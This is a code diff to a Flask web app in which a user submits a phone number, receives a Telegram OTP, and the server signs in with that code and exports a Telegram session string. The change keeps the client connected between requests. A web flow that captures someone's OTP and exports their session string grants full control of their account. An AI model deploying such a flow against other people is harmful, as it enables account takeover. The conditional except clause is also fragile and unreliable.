@@ -42,11 +42,15 @@ def send_code():
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             sent_code = await client.send_code(phone)
-            await client.disconnect()
-            return sent_code.phone_code_hash
+            return client, sent_code.phone_code_hash
 
-        phone_code_hash = asyncio.run(main())
-        temp_clients[phone] = phone_code_hash
+        client, phone_code_hash = asyncio.run(main())
+        
+        # ক্লায়েন্ট এবং হাশ সংরক্ষণ করে রাখা
+        temp_clients[phone] = {
+            "client": client,
+            "phone_code_hash": phone_code_hash
+        }
         
         return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
     except Exception as e:
@@ -64,14 +68,12 @@ def verify_code():
     if phone not in temp_clients:
         return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400
 
-    phone_code_hash = temp_clients[phone]
+    user_data = temp_clients[phone]
+    client = user_data["client"]
+    phone_code_hash = user_data["phone_code_hash"]
 
     try:
-        session_name = f"session_{phone.replace('+', '')}"
-        
         async def verify_main():
-            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
-            await client.connect()
             await client.sign_in(phone, phone_code_hash, code)
             session_string = await client.export_session_string()
             
@@ -89,7 +91,7 @@ def verify_code():
         
     except PhoneCodeInvalid:
         return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
-    except SessionPasswordNeeded:
+    except SessionPasswordNotFound if "SessionPasswordNotFound" in globals() else SessionPasswordNeeded:
         return jsonify({"status": "success", "message": "2FA Password required"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
